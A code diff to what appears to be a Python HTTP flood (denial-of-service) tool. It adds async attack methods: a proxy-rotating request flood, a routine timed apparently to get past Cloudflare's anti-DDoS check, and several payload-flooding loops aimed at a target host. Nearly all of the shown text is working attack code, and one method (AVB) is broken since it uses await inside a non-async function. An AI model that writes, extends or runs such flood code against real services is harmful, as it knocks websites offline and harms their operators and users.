@@ -1,5 +1,6 @@
-import asyncio
+import aiohttp
 import aiohttp_socks
+import asyncio
 
 import logging
 from contextlib import suppress
@@ -923,10 +924,11 @@ class AsyncHttpFlood(HttpFlood):
     # XXX: config for timeouts
     # XXX: with async generators the attack itself could be defined
     #      independently from I/O operations
-    async def _generic_flood(self, payload: bytes) -> int:
+    async def _generic_flood(self, payload: bytes, *, rpc: Optional[int] = None) -> int:
+        rpc = rpc or self._rpc
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
-        for _ in range(self._rpc):
+        for _ in range(rpc):
             writer.write(payload)
             await asyncio.wait_for(writer.drain(), timeout=1)
             self._stats.track(1, packet_size)
@@ -1027,6 +1029,76 @@ class AsyncHttpFlood(HttpFlood):
             self.SpoofIP + "\r\n"
         )
         return await self._generic_flood(payload)
+
+    # XXX: with async we have an option to track open connections/requests in flight
+    # XXX: timeout for each request
+    async def BYPASS(self) -> int:
+        connector = self._proxies.pick_random_connector() if self._proxies else None
+        packets_sent = 0
+        async with aiohttp.ClientSession(connector=connector) as s:
+            for _ in range(self._rpc):
+                async with s.get(self._target.human_repr()) as response:
+                    # XXX: this could be optimized by reading chunks
+                    await response.text()
+                    # XXX: we need to track in/out traffic separately
+                    self._stats.track(1, len(self._target.human_repr()))
+                    packets_sent += 1
+        return packets_sent
+    
+    async def CFBUAM(self) -> int:
+        payload: bytes = self.generate_payload()
+        packets_sent, packet_size = 0, len(payload)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        writer.write(payload)
+        await asyncio.wait_for(writer.drain(), timeout=1)
+        self._stats.track(1, packet_size)
+        packets_sent += 1
+        await asyncio.sleep(5.01)
+        ts = time()
+        for _ in range(self._rpc):
+            writer.write(payload)
+            await asyncio.wait_for(writer.drain(), timeout=1)
+            self._stats.track(1, packet_size)
+            packets_sent += 1
+            if time() > ts + 120: break
+        writer.close()
+        await asyncio.wait_for(writer.wait_closed(), timeout=1)
+        return packets_sent
+
+    async def EVEN(self) -> int:
+        payload: bytes = self.generate_payload()
+        packets_sent, packet_size = 0, len(payload)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        for _ in range(self._rpc):
+            writer.write(payload)
+            await asyncio.wait_for(writer.drain(), timeout=1)
+            packets_sent += 1
+            self._stats.track(1, packet_size)
+            await asyncio.wait_for(reader.read(1), timeout=1)
+        return packets_sent
+
+    async def OVH(self) -> int:
+        payload: bytes = self.generate_payload()
+        return await self._generic_flood(payload, rpc=min(self._rpc, 5))
+    
+    def AVB(self) -> int:
+        payload: bytes = self.generate_payload()
+        packets_sent, packet_size = 0, len(payload)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        for _ in range(self._rpc):
+            await asyncio.sleep(max(self._rpc / 1000, 1))
+            writer.write(payload)
+            await asyncio.wait_for(writer.drain(), timeout=1)
+            packets_sent += 1
+            self._stats.track(1, packet_size)
+            await asyncio.wait_for(reader.read(1), timeout=1)
+        return packets_sent
+
+    async def SLOW(self) -> int:
+        pass
+
+    async def DOWNLOADER(self) -> int:
+        pass
 
 
 # XXX: the separation should be based on the socket type: TCP vs. UDP
